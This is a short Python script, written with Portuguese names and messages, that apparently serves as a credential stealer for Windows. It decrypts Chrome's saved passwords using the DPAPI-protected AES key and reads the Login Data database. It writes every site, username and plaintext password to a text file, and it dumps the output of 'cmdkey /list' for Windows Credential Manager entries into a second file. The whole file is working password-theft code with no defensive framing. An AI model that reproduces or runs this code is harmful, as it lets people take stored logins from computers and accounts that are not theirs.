import os
import json
import base64
import shutil
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import subprocess

def get_encryption_key():
    path = os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data\Local State")
    with open(path, "r", encoding="utf-8") as file:
        local_state = json.loads(file.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # remove DPAPI
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)[:-16].decode()
        return decrypted
    except Exception:
        try:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
        except:
            return "Erro ao descriptografar"

def extrair_senhas_chrome():
    key = get_encryption_key()
    login_db = os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data\Default\Login Data")
    temp_db = "Loginvault.db"
    shutil.copyfile(login_db, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    with open("senhas_web.txt", "w", encoding="utf-8") as file:
        for row in cursor.fetchall():
            site = row[0]
            user = row[1]
            senha = decrypt_password(row[2], key)
            file.write(f"Site: {site}\nUsuário: {user}\nSenha: {senha}\n\n")

    cursor.close()
    conn.close()
    os.remove(temp_db)

def extrair_credenciais_windows():
    try:
        output = subprocess.check_output("cmdkey /list", shell=True, text=True)
        with open("credenciais_pc.txt", "w", encoding="utf-8") as f:
            f.write("Credenciais do Gerenciador de Credenciais do Windows:\n\n")
            f.write(output)
    except Exception as e:
        with open("credenciais_pc.txt", "w", encoding="utf-8") as f:
            f.write(f"Erro ao acessar credenciais: {str(e)}")

def main():
    extrair_senhas_chrome()
    extrair_credenciais_windows()
    print("✅ Tudo extraído! Arquivos gerados: senhas_web.txt e credenciais_pc.txt")

if __name__ == "__main__":
    main()
 